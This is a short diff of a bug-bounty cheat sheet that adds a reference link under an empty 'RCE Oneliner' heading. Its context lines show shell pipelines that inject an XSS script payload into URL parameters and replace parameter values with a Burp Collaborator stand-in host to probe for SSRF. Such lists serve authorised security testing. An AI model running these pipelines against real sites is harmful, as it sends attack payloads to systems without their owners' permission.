@@ -9,3 +9,7 @@ cat file.txt | gf xss | grep ‘source=’ | qsreplace ‘”><script>confirm(1)
 findomain -t example.com -q | httpx -silent -threads 1000 | gau | grep “=” | qsreplace http://YOUR.burpcollaborator.net
 
 ## RCE Oneliner:
+
+
+## References:
+https://medium.com/@theUnixe/find-ssrf-lfi-xss-using-httpx-waybackurls-gf-gau-qsreplace-d90f59eb5055
